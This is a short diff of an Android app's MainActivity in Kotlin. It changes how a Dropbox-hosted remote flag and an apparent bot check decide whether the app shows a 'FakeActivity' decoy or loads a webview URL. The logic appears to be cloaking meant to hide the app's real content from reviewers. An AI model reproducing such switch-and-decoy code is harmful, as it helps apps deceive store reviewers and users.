@@ -109,7 +109,7 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
             com.android.volley.Request.Method.GET,
             "https://dl.dropboxusercontent.com/s/tit63ngqwdc8l4b/kek.json?dl=0",
             { response ->
-                if (response.toString() == "true") {
+                if (response.toString() != "true") {
                     progressBar.visibility = ProgressBar.GONE
                     startActivity(Intent(this@MainActivity, FakeActivity::class.java))
                     finish()
@@ -293,11 +293,9 @@ class MainActivity : AppCompatActivity(), OneSignal.NotificationReceivedHandler,
 
             Log.d(TAG, "IS_BOT$isBot")
 
-            if (backDeque.isNotEmpty()) {
-                progressBar.visibility = ProgressBar.GONE
-                startActivity(Intent(this@MainActivity, FakeActivity::class.java))
-
-                finish()
+            if (backDeque.isNotEmpty()  && backDeque.first != "") {
+                initWebView()
+                startWebView(backDeque.first)
             } else {
                 handler.post(conversionTask)
 
